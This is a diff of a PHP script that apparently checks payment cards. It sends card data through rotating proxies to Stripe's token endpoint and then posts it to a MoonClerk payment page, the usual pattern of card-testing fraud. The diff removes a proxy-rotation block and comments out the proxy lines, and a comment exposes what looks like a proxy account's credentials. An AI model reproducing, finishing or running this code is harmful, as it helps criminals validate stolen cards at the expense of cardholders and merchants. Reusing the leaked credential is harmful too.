@@ -131,30 +131,7 @@ if($state=="Alabama"){ $state="AL";
 }*/
 
 
-$ip = array(
-  1 => 'http://fi.proxiware.com:28000',
-  2 => 'http://fi.proxiware.com:28000',
-    ); 
-    $socks = array_rand($ip);
-    $p = $ip[$socks];
 
-$ch = curl_init();
-//curl_setopt($ch, CURLOPT_PROXY, "http://ca.proxiware.com:22000");
-//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
-curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/json');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-$data = curl_exec($ch);
-echo $data;
-
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, $p);
-//curl_setopt($curl_reponse, CURLOPT_PROXYPORT, $proxy_port);
-//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
-curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/json');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-$dat = curl_exec($ch);
-echo $dat;
 
 
 
@@ -184,7 +161,7 @@ $ch = curl_init();
 ///curl
 /////////========Luminati
 ////////=========Socks Proxy
-curl_setopt($ch, CURLOPT_PROXY, $p);
+//curl_setopt($ch, CURLOPT_PROXY, $p);
 ///curl_setopt($ch, CURLOPT_PROXYUSERPWD, "pxu19057-0:3ngexg3AFr1CLDHPjVzK");
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); ////This may differ from site to site
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -216,7 +193,7 @@ $token = trim(strip_tags(getStr($result1,'"id": "','"')));
 echo $token;
 
  $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, $p);
+//curl_setopt($ch, CURLOPT_PROXY, $p);
  curl_setopt($ch, CURLOPT_URL, 'https://app.moonclerk.com/pay/7bj96o4wja6i');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
